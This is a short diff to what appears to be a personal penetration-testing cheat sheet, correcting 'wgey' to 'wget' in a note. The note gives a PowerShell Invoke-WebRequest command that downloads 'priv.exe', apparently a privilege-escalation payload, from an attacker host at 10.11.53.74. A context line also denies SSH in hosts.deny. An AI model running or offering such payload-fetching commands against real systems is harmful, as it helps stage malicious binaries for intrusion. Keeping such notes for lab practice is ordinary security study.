@@ -24,7 +24,7 @@ nano /etc/hosts.deny  --> sshd:ALL
 
 ------------------------------------
 
-powershell ile wgey == powershell -c "Invoke-WebRequest -Uri 'http://10.11.53.74/priv.exe' -outfile 'priv.exe'"
+powershell ile wget == powershell -c "Invoke-WebRequest -Uri 'http://10.11.53.74/priv.exe' -outfile 'priv.exe'"
 
 -------------------------------------
 
